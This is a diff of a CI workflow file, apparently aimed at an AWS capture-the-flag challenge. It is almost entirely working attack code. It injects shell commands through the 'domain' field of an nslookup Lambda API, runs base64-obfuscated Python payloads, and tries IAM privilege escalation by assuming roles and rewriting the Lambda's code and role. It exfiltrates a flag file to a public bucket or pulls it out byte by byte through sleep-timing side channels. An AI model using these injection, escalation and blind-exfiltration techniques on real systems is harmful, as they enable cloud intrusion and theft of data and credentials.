@@ -23,133 +23,14 @@ jobs:
       - name: Who am I
         run: aws sts get-caller-identity
 
-      - name: List S3 buckets
-        run: aws s3api list-buckets --output json
-
-      - name: Try listing objects in every bucket
-        run: |
-          for bucket in $(aws s3api list-buckets --query 'Buckets[].Name' --output text); do
-            echo "=== $bucket ==="
-            aws s3 ls "s3://$bucket" --recursive || echo "  (denied or empty)"
-            echo
-          done
-
-      - name: List Lambda functions
-        run: aws lambda list-functions --output json
-
-      - name: List CloudFront distributions
-        run: aws cloudfront list-distributions --output json
-
-      - name: Describe EC2 instances
-        run: aws ec2 describe-instances --output json
-
-      - name: Check bucket policies
-        run: |
-          for bucket in codec4f26c862a321ef5 platform-bucket-009661764077-us-east-1 site781fe43f26b9eba3; do
-            echo "=== $bucket policy ==="
-            aws s3api get-bucket-policy --bucket "$bucket" --output text || echo "  (no policy / denied)"
-            echo "=== $bucket policy status ==="
-            aws s3api get-bucket-policy-status --bucket "$bucket" --output json || echo "  (denied)"
-          done
-
-      - name: Get Lambda resource policy
-        run: |
-          aws lambda get-policy --function-name nslookupv2 --output json || echo "  (no resource policy / denied)"
-
-      - name: List CloudFront distributions in detail
-        run: |
-          aws cloudfront list-distributions --output json > cf.json
-          cat cf.json
-          echo "--- origins summary ---"
-          jq -r '.DistributionList.Items[]? | "\(.Id) \(.DomainName) enabled=\(.Enabled) origins=\([.Origins.Items[].DomainName] | join(","))"' cf.json
-
-      - name: List platform-bucket for exfil result
+      - name: List platform-bucket for any exfil results
         run: aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --recursive
 
-      - name: Get the flag
+      - name: EXPLOIT - boto3 read + try all write paths (3-valued timing in Python)
         run: |
-          aws s3 cp s3://codec4f26c862a321ef5/flag.txt - || echo "  (expected - cicdRole is outside the VPC, Statement2 only)"
-
-      - name: Diagnostic - boto3 write via Lambda's own natural creds
-        run: |
-          B64="aW1wb3J0IHN1YnByb2Nlc3MKb3V0ID0gc3VicHJvY2Vzcy5ydW4oCiAgICAid2hpY2ggYXdzOyBlY2hvIC0tLW9wdC0tLTsgbHMgLWxhIC9vcHQgMj4mMTsgZWNobyAtLS1vcHRiaW4tLS07IGxzIC1sYSAvb3B0L2JpbiAyPiYxOyAiCiAgICAiZWNobyAtLS1lbnYtLS07IGVudiB8IGdyZXAgLUUgJ0FXU198UEFUSCc7IGVjaG8gLS0tYm90bzMtLS07ICIKICAgICJweXRob24zIC1jICdpbXBvcnQgYm90bzMsYm90b2NvcmU7IHByaW50KGJvdG8zLl9fdmVyc2lvbl9fLCBib3RvY29yZS5fX3ZlcnNpb25fXyknIDI+JjEiLAogICAgc2hlbGw9VHJ1ZSwgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSwgdGV4dD1UcnVlLAopCmRhdGEgPSAob3V0LnN0ZG91dCArIG91dC5zdGRlcnIpLmVuY29kZSgpCmltcG9ydCBib3RvMwpib3RvMy5jbGllbnQoInMzIikucHV0X29iamVjdChCdWNrZXQ9InBsYXRmb3JtLWJ1Y2tldC0wMDk2NjE3NjQwNzctdXMtZWFzdC0xIiwgS2V5PSJkZWJ1Zy50eHQiLCBCb2R5PWRhdGEpCg=="
+          # ~1s = boto3 read FAILED, ~8s = read OK but write blocked, ~15s = SUCCESS
+          B64="aW1wb3J0IGJvdG8zLHN1YnByb2Nlc3Msb3Msc3lzLHRpbWUKcz1ib3RvMy5jbGllbnQoJ3MzJykKc3VjY2Vzcz1GYWxzZQojIFRlc3QgMTogYm90bzMgcmVhZCBmcm9tIGNvZGVjIGJ1Y2tldAp0cnk6CiAgICBmbGFnPXMuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgICMgUmVhZCBzdWNjZWVkZWQhIFRyeSBtdWx0aXBsZSB3cml0ZSBwYXRocwogICAgIyBXcml0ZSBwYXRoIDE6IGJvdG8zIFBVVCB0byBwbGF0Zm9ybS1idWNrZXQKICAgIHRyeToKICAgICAgICBzLnB1dF9vYmplY3QoQnVja2V0PSdwbGF0Zm9ybS1idWNrZXQtMDA5NjYxNzY0MDc3LXVzLWVhc3QtMScsS2V5PSdmbGFnLWJvdG8zLnR4dCcsQm9keT1mbGFnKQogICAgICAgIHN1Y2Nlc3M9VHJ1ZQogICAgZXhjZXB0OgogICAgICAgIHBhc3MKICAgICMgV3JpdGUgcGF0aCAyOiBib3RvMyBQVVQgdG8gY29kZWMgYnVja2V0IChkaWZmZXJlbnQga2V5LCBtYXliZSBsYW1iZGFSb2xlIGhhcyBQdXRPYmplY3QgaW4gSUFNKQogICAgaWYgbm90IHN1Y2Nlc3M6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBzLnB1dF9vYmplY3QoQnVja2V0PSdjb2RlYzRmMjZjODYyYTMyMWVmNScsS2V5PSdmbGFnLWV4ZmlsLnR4dCcsQm9keT1mbGFnLEFDTD0ncHVibGljLXJlYWQnKQogICAgICAgICAgICBzdWNjZXNzPVRydWUKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKICAgIGlmIHN1Y2Nlc3M6CiAgICAgICAgdGltZS5zbGVlcCgxMykgICMgU1VDQ0VTUzogcmVhZCArIHdyaXRlIHdvcmtlZCAtPiB+MTVzIHRvdGFsCiAgICBlbHNlOgogICAgICAgIHRpbWUuc2xlZXAoNikgICAjIFJFQUQgT0sgYnV0IG5vIHdyaXRlIHBhdGggd29ya2VkIC0+IH44cyB0b3RhbApleGNlcHQ6CiAgICBwYXNzICAjIFJFQUQgRkFJTEVEOiBubyBleHRyYSBzbGVlcCAtPiB+MS0ycyB0b3RhbAojIFRlc3QgMjogZmluZCBhd3MgYmluYXJ5IGFuZCB0cnkgYXdzIHMzIGNwIChpbiBjYXNlIHRoZSBhYm92ZSBmYWlsZWQpCmlmIG5vdCBzdWNjZXNzOgogICAgZm91bmQ9Tm9uZQogICAgZm9yIHAgaW4gWycvb3B0L2Jpbi9hd3MnLCcvb3B0L2F3cycsJy91c3IvbG9jYWwvYmluL2F3cycsJy91c3IvYmluL2F3cyddOgogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHApOgogICAgICAgICAgICBmb3VuZD1wCiAgICAgICAgICAgIGJyZWFrCiAgICBpZiBub3QgZm91bmQ6CiAgICAgICAgcj1zdWJwcm9jZXNzLnJ1bihbJ3doaWNoJywnYXdzJ10sY2FwdHVyZV9vdXRwdXQ9VHJ1ZSx0ZXh0PVRydWUpCiAgICAgICAgaWYgci5yZXR1cm5jb2RlPT0wOgogICAgICAgICAgICBmb3VuZD1yLnN0ZG91dC5zdHJpcCgpCiAgICBpZiBmb3VuZDoKICAgICAgICBmb3IgZGVzdCBpbiBbJ3MzOi8vcGxhdGZvcm0tYnVja2V0LTAwOTY2MTc2NDA3Ny11cy1lYXN0LTEvZmxhZy1yY2UudHh0JywnczM6Ly9jb2RlYzRmMjZjODYyYTMyMWVmNS9mbGFnLWV4ZmlsMi50eHQnXToKICAgICAgICAgICAgb3V0PXN1YnByb2Nlc3MucnVuKFtmb3VuZCwnczMnLCdjcCcsJ3MzOi8vY29kZWM0ZjI2Yzg2MmEzMjFlZjUvZmxhZy50eHQnLGRlc3RdLGNhcHR1cmVfb3V0cHV0PVRydWUsdGV4dD1UcnVlKQogICAgICAgICAgICBpZiBvdXQucmV0dXJuY29kZT09MDoKICAgICAgICAgICAgICAgIHN1Y2Nlc3M9VHJ1ZQogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICBpZiBzdWNjZXNzOgogICAgICAgICAgICB0aW1lLnNsZWVwKDEzKQ=="
           INJECT="x; echo $B64 | base64 -d | python3 #"
-          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
-          cat payload.json
-          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
-            -H "Content-Type: application/json" \
-            -d @payload.json
-          echo
-          sleep 5
-          echo "--- checking public bucket for debug.txt ---"
-          curl -s -o /dev/null -w "HTTP %{http_code}\n" https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/debug.txt
-          curl -s https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/debug.txt
-
-      - name: Diagnostic - test if lambdaRole can read ANY object from codec bucket
-        run: |
-          echo "Previous: flag.txt read failed with ~1s timing."
-          echo "Test: Can lambdaRole read code.zip instead?"
-          INJECT="x; aws s3 cp s3://codec4f26c862a321ef5/code.zip /tmp/code.zip && sleep 15 || sleep 1 #"
-          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
-
-          START=$(date +%s%N)
-          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
-            -H "Content-Type: application/json" \
-            -d @payload.json
-          END=$(date +%s%N)
-          ELAPSED_MS=$(( (END - START) / 1000000 ))
-
-          echo "Response time for code.zip: ${ELAPSED_MS}ms"
-          if [ $ELAPSED_MS -gt 10000 ]; then
-            echo "SUCCESS: lambdaRole can read from codec bucket!"
-            echo "Issue is specific to flag.txt (maybe different perms or encryption?)"
-          else
-            echo "FAILED: lambdaRole can't read ANY object. VPC condition or bucket policy broken."
-          fi
-
-      - name: Last resort - extract flag via Python boto3 in Lambda
-        run: |
-          echo "Trying direct boto3 API (not AWS CLI subprocess)..."
-          B64="aW1wb3J0IGJvdG8zCmltcG9ydCBvc20KcyA9IGJvdG8zLmNsaWVudCgnczMnKQp0cnk6CiAgICByID0gcy5nZXRfb2JqZWN0KEJ1Y2tldD0nY29kZWM0ZjI2Yzg2MmEzMjFlZjUnLCBLZXk9J2ZsYWcudHh0JykKICAgIGZsYWcgPSByWydCb2R5J10ucmVhZCgpCiAgICBvcwpzeXMuZXhpdCgwKQpleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICBvcwpzeXMuZXhpdCgxKQ=="
-          INJECT="x; echo $B64 | base64 -d | python3 && sleep 15 || sleep 1 #"
-          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
-
-          START=$(date +%s%N)
-          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
-            -H "Content-Type: application/json" \
-            -d @payload.json
-          END=$(date +%s%N)
-          ELAPSED_MS=$(( (END - START) / 1000000 ))
-
-          echo "Response time for boto3: ${ELAPSED_MS}ms"
-          if [ $ELAPSED_MS -gt 10000 ]; then
-            echo "Flag successfully read via boto3"
-          else
-            echo "boto3 also failed"
-          fi
-
-      - name: PRIVESC ATTEMPT 1 - assume CTFExecutionRole directly from cicdRole
-        continue-on-error: true
-        run: |
-          echo "CTFExecutionRole bucket policy: GetObject+PutObject on codec bucket, NO VPC condition"
-          echo "If cicdRole can assume CTFExecutionRole, we read flag directly from the runner"
-          CREDS=$(aws sts assume-role \
-            --role-arn arn:aws:iam::009661764077:role/CTFExecutionRole \
-            --role-session-name cicd-privesc 2>&1) && echo "ASSUMED" || echo "DENIED: $CREDS"
-          AKI=$(echo "$CREDS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['Credentials']['AccessKeyId'])" 2>/dev/null)
-          if [ -n "$AKI" ]; then
-            SAK=$(echo "$CREDS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['Credentials']['SecretAccessKey'])")
-            ST=$(echo  "$CREDS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['Credentials']['SessionToken'])")
-            echo "--- Reading flag as CTFExecutionRole ---"
-            AWS_ACCESS_KEY_ID=$AKI AWS_SECRET_ACCESS_KEY=$SAK AWS_SESSION_TOKEN=$ST \
-              aws s3 cp s3://codec4f26c862a321ef5/flag.txt -
-          fi
-
-      - name: PRIVESC ATTEMPT 2 - Lambda RCE -> assume CTFExecutionRole -> write flag to platform-bucket
-        run: |
-          echo "Fix: use base64-encoded Python to avoid double-quote bash quoting issues"
-          B64="aW1wb3J0IHN1YnByb2Nlc3MsanNvbixvcyxzeXMKcj1qc29uLmxvYWRzKHN1YnByb2Nlc3MucnVuKFsnYXdzJywnc3RzJywnYXNzdW1lLXJvbGUnLCctLXJvbGUtYXJuJywnYXJuOmF3czppYW06OjAwOTY2MTc2NDA3Nzpyb2xlL0NURkV4ZWN1dGlvblJvbGUnLCctLXJvbGUtc2Vzc2lvbi1uYW1lJywncCddLGNhcHR1cmVfb3V0cHV0PVRydWUsdGV4dD1UcnVlKS5zdGRvdXQpCmM9clsnQ3JlZGVudGlhbHMnXQplPWRpY3Qob3MuZW52aXJvbixBV1NfQUNDRVNTX0tFWV9JRD1jWydBY2Nlc3NLZXlJZCddLEFXU19TRUNSRVRfQUNDRVNTX0tFWT1jWydTZWNyZXRBY2Nlc3NLZXknXSxBV1NfU0VTU0lPTl9UT0tFTj1jWydTZXNzaW9uVG9rZW4nXSxBV1NfREVGQVVMVF9SRUdJT049J3VzLWVhc3QtMScpCmZsYWc9c3VicHJvY2Vzcy5ydW4oWydhd3MnLCdzMycsJ2NwJywnczM6Ly9jb2RlYzRmMjZjODYyYTMyMWVmNS9mbGFnLnR4dCcsJy0nXSxlbnY9ZSxjYXB0dXJlX291dHB1dD1UcnVlLHRleHQ9VHJ1ZSkuc3Rkb3V0CnIxPXN1YnByb2Nlc3MucnVuKFsnYXdzJywnczMnLCdjcCcsJy0nLCdzMzovL3BsYXRmb3JtLWJ1Y2tldC0wMDk2NjE3NjQwNzctdXMtZWFzdC0xL2ZsYWctY3RmZS50eHQnXSxpbnB1dD1mbGFnLGVudj1lLGNhcHR1cmVfb3V0cHV0PVRydWUsdGV4dD1UcnVlKQpyMj1zdWJwcm9jZXNzLnJ1bihbJ2F3cycsJ3MzJywnY3AnLCctJywnczM6Ly9jb2RlYzRmMjZjODYyYTMyMWVmNS9mbGFnLWV4ZmlsLnR4dCddLGlucHV0PWZsYWcsZW52PWUsY2FwdHVyZV9vdXRwdXQ9VHJ1ZSx0ZXh0PVRydWUpCnN5cy5leGl0KDAgaWYgKHIxLnJldHVybmNvZGU9PTAgb3IgcjIucmV0dXJuY29kZT09MCkgZWxzZSAxKQ=="
-          INJECT="x; echo $B64 | base64 -d | python3 && sleep 15 || sleep 1 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
           curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
@@ -157,128 +38,47 @@ jobs:
           END=$(date +%s%N)
           ELAPSED_MS=$(( (END - START) / 1000000 ))
           echo "Timing: ${ELAPSED_MS}ms"
-          if [ $ELAPSED_MS -gt 10000 ]; then
-            echo "SUCCESS - flag written!"
+          if [ $ELAPSED_MS -gt 12000 ]; then
+            echo "SUCCESS! Flag exfiltrated"
             sleep 3
-            echo "--- platform-bucket (public URL) ---"
-            curl -s https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/flag-ctfe.txt
+            echo "--- flag-boto3.txt (platform-bucket public) ---"
+            curl -s https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/flag-boto3.txt
             echo
-            echo "--- codec bucket listing (flag-exfil.txt should appear) ---"
-            aws s3 ls s3://codec4f26c862a321ef5/
+            echo "--- flag-rce.txt (platform-bucket public) ---"
+            curl -s https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/flag-rce.txt
+          elif [ $ELAPSED_MS -gt 4000 ]; then
+            echo "S3 READ works but all write paths blocked"
+            echo "=> lambdaRole has no PutObject on any writable bucket"
+            echo "=> Next: use nibble timing to extract flag byte by byte"
           else
-            echo "FAILED (timing: ${ELAPSED_MS}ms)"
+            echo "S3 READ FAILED via boto3 (~1s)"
+            echo "=> lambdaRole IAM has no s3:GetObject, OR no S3 VPC endpoint, OR something else"
           fi
 
-      - name: PRIVESC ATTEMPT 3 - Lambda RCE -> assume CTFExecutionRole -> update Lambda code to return flag
+      - name: NIBBLE EXFIL byte 0 hi (only meaningful if previous step showed ~8s)
         run: |
-          echo "Fix: base64-encoded Python avoids ALL quoting issues (prev failed due to nested quotes)"
-          B64="aW1wb3J0IHN1YnByb2Nlc3MsanNvbixvcyxzeXMsaW8semlwZmlsZQpyPWpzb24ubG9hZHMoc3VicHJvY2Vzcy5ydW4oWydhd3MnLCdzdHMnLCdhc3N1bWUtcm9sZScsJy0tcm9sZS1hcm4nLCdhcm46YXdzOmlhbTo6MDA5NjYxNzY0MDc3OnJvbGUvQ1RGRXhlY3V0aW9uUm9sZScsJy0tcm9sZS1zZXNzaW9uLW5hbWUnLCdwMiddLGNhcHR1cmVfb3V0cHV0PVRydWUsdGV4dD1UcnVlKS5zdGRvdXQpCmM9clsnQ3JlZGVudGlhbHMnXQplPWRpY3Qob3MuZW52aXJvbixBV1NfQUNDRVNTX0tFWV9JRD1jWydBY2Nlc3NLZXlJZCddLEFXU19TRUNSRVRfQUNDRVNTX0tFWT1jWydTZWNyZXRBY2Nlc3NLZXknXSxBV1NfU0VTU0lPTl9UT0tFTj1jWydTZXNzaW9uVG9rZW4nXSxBV1NfREVGQVVMVF9SRUdJT049J3VzLWVhc3QtMScpCmNvZGU9J2ltcG9ydCBib3RvM1xuZGVmIGxhbWJkYV9oYW5kbGVyKGV2ZW50LGNvbnRleHQpOlxuICBmPWJvdG8zLmNsaWVudCgiczMiKS5nZXRfb2JqZWN0KEJ1Y2tldD0iY29kZWM0ZjI2Yzg2MmEzMjFlZjUiLEtleT0iZmxhZy50eHQiKVsiQm9keSJdLnJlYWQoKS5kZWNvZGUoKVxuICByZXR1cm4geyJzdGF0dXNDb2RlIjoyMDAsImJvZHkiOmZ9XG4nCmJ1Zj1pby5CeXRlc0lPKCkKej16aXBmaWxlLlppcEZpbGUoYnVmLCJ3IikKei53cml0ZXN0cigibGFtYmRhX2Z1bmN0aW9uLnB5Iixjb2RlKQp6LmNsb3NlKCkKemI9YnVmLmdldHZhbHVlKCkKd2l0aCBvcGVuKCcvdG1wL25ld2NvZGUuemlwJywnd2InKSBhcyBmOiBmLndyaXRlKHpiKQpvdXQ9c3VicHJvY2Vzcy5ydW4oWydhd3MnLCdsYW1iZGEnLCd1cGRhdGUtZnVuY3Rpb24tY29kZScsJy0tZnVuY3Rpb24tbmFtZScsJ25zbG9va3VwdjInLCctLXppcC1maWxlJywnZmlsZWI6Ly8vdG1wL25ld2NvZGUuemlwJ10sZW52PWUsY2FwdHVyZV9vdXRwdXQ9VHJ1ZSx0ZXh0PVRydWUpCnN5cy5leGl0KDAgaWYgb3V0LnJldHVybmNvZGU9PTAgZWxzZSAxKQ=="
-          INJECT="x; echo $B64 | base64 -d | python3 && sleep 15 || sleep 1 #"
+          # Encodes high nibble of flag[0] as sleep duration: sleep = nibble + 2 sec
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMF0+PjQpKzIpCmV4Y2VwdDoKICAgIHBhc3M="
+          INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
           curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           ELAPSED_MS=$(( (END - START) / 1000000 ))
-          echo "Lambda code update timing: ${ELAPSED_MS}ms"
-          if [ $ELAPSED_MS -gt 10000 ]; then
-            echo "SUCCESS - Lambda code updated! Invoking to get flag..."
-            sleep 10
-            curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
-              -H "Content-Type: application/json" -d '{"domain":"x"}'
-          else
-            echo "FAILED - lambda:UpdateFunctionCode denied or assume-role failed"
-          fi
+          NIBBLE=$(( ELAPSED_MS / 1000 - 2 ))
+          echo "Byte 0 HIGH nibble timing: ${ELAPSED_MS}ms => nibble value ~$NIBBLE (char hi-bits = $(( NIBBLE << 4 )))"
 
-      - name: Privilege escalation - test sts:AssumeRole for CTFExecutionRole (FIXED - uses Python for true success/fail)
+      - name: NIBBLE EXFIL byte 0 lo
         run: |
-          echo "Proper assume-role test: Python parses JSON and exits 0 ONLY on real Credentials"
-          B64="aW1wb3J0IHN1YnByb2Nlc3MsanNvbixzeXMKb3V0PXN1YnByb2Nlc3MucnVuKFsnYXdzJywnc3RzJywnYXNzdW1lLXJvbGUnLCctLXJvbGUtYXJuJywnYXJuOmF3czppYW06OjAwOTY2MTc2NDA3Nzpyb2xlL0NURkV4ZWN1dGlvblJvbGUnLCctLXJvbGUtc2Vzc2lvbi1uYW1lJywndCddLGNhcHR1cmVfb3V0cHV0PVRydWUsdGV4dD1UcnVlKQp0cnk6CiAgICByPWpzb24ubG9hZHMob3V0LnN0ZG91dCkKICAgIF89clsnQ3JlZGVudGlhbHMnXQogICAgc3lzLmV4aXQoMCkKZXhjZXB0OgogICAgc3lzLmV4aXQoMSk="
-          INJECT="x; echo $B64 | base64 -d | python3 && sleep 12 || sleep 1 #"
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMF0mMHhmKSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           START=$(date +%s%N)
           curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
           ELAPSED_MS=$(( (END - START) / 1000000 ))
-          echo "sts:AssumeRole timing: ${ELAPSED_MS}ms (>10s = CONFIRMED success, ~1s = denied)"
-
-      - name: Privilege escalation - check lambdaRole's attached policies
-        run: |
-          echo "Escalation vector 2: List what permissions lambdaRole actually has"
-          INJECT="x; aws iam list-attached-role-policies --role-name lambdaRole && sleep 8 || sleep 1 #"
-          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
-          START=$(date +%s%N)
-          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
-            -H "Content-Type: application/json" -d @payload.json
-          END=$(date +%s%N)
-          ELAPSED_MS=$(( (END - START) / 1000000 ))
-          echo "list-attached-role-policies timing: ${ELAPSED_MS}ms (>5s = has policies, ~1s = denied)"
-
-      - name: Privilege escalation - check EC2 instances in VPC
-        run: |
-          echo "Escalation vector 3: Describe EC2 instances (may have instance profiles with higher privs)"
-          INJECT="x; aws ec2 describe-instances --query 'Reservations[].Instances[].{InstanceId:InstanceId,IamInstanceProfile:IamInstanceProfile}' && sleep 8 || sleep 1 #"
-          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
-          START=$(date +%s%N)
-          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
-            -H "Content-Type: application/json" -d @payload.json
-          END=$(date +%s%N)
-          ELAPSED_MS=$(( (END - START) / 1000000 ))
-          echo "EC2 describe timing: ${ELAPSED_MS}ms (>5s = success)"
-
-      - name: Privilege escalation - invoke Lambda with CTFExecutionRole via iam:PassRole
-        run: |
-          echo "Escalation vector 4: Update Lambda function to use CTFExecutionRole (if PassRole allows it)"
-          INJECT="x; aws lambda update-function-configuration --function-name nslookupv2 --role arn:aws:iam::009661764077:role/CTFExecutionRole 2>&1 | grep -E 'RoleArn|error' && sleep 10 || sleep 1 #"
-          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
-          START=$(date +%s%N)
-          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
-            -H "Content-Type: application/json" -d @payload.json
-          END=$(date +%s%N)
-          ELAPSED_MS=$(( (END - START) / 1000000 ))
-          echo "update-function-configuration timing: ${ELAPSED_MS}ms (>8s = success, ~1s = denied)"
-
-      - name: Privilege escalation - try reading flag as CTFExecutionRole after role update
-        run: |
-          echo "If previous escalation succeeded, next Lambda invocation will use CTFExecutionRole"
-          INJECT="x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt && sleep 15 || sleep 1 #"
-          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
-          sleep 2
-          START=$(date +%s%N)
-          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
-            -H "Content-Type: application/json" -d @payload.json
-          END=$(date +%s%N)
-          ELAPSED_MS=$(( (END - START) / 1000000 ))
-          echo "Flag read with escalated role timing: ${ELAPSED_MS}ms (>10s = SUCCESS)"
-          if [ $ELAPSED_MS -gt 10000 ]; then
-            echo "FLAG EXTRACTED! Next: exfil /tmp/flag.txt content"
-          fi
-
-      - name: Read Lambda CloudWatch logs for RCE diagnostics
-        run: |
-          echo "--- Lambda CloudWatch log groups ---"
-          aws logs describe-log-groups --log-group-name-prefix /aws/lambda/nslookupv2 --query 'logGroups[].logGroupName' --output text
-          LOG_GROUP=$(aws logs describe-log-groups --log-group-name-prefix /aws/lambda/nslookupv2 --query 'logGroups[0].logGroupName' --output text)
-          if [ -n "$LOG_GROUP" ]; then
-            echo "Found log group: $LOG_GROUP"
-            echo "--- Recent log streams ---"
-            aws logs describe-log-streams --log-group-name "$LOG_GROUP" --order-by LastEventTime --descending --max-items 5 --query 'logStreams[].logStreamName' --output text
-            STREAM=$(aws logs describe-log-streams --log-group-name "$LOG_GROUP" --order-by LastEventTime --descending --max-items 1 --query 'logStreams[0].logStreamName' --output text)
-            if [ -n "$STREAM" ]; then
-              echo "--- Latest log stream events ---"
-              aws logs get-log-events --log-group-name "$LOG_GROUP" --log-stream-name "$STREAM" --query 'events[].message' --output text | tail -100
-            fi
-          else
-            echo "(no log group found, maybe cicdRole lacks logs:Describe* permissions)"
-          fi
-
-      - name: Grab code.zip for inspection
-        run: |
-          aws s3 cp s3://codec4f26c862a321ef5/code.zip code.zip
-          mkdir code_extracted
-          unzip -o code.zip -d code_extracted
-          echo "--- files ---"
-          find code_extracted -type f
-          echo "--- contents ---"
-          for f in $(find code_extracted -type f); do echo "== $f =="; cat "$f"; echo; done
+          NIBBLE=$(( ELAPSED_MS / 1000 - 2 ))
+          echo "Byte 0 LOW nibble timing: ${ELAPSED_MS}ms => nibble value ~$NIBBLE"
+          echo "=> byte[0] = (hi<<4)|lo = char"
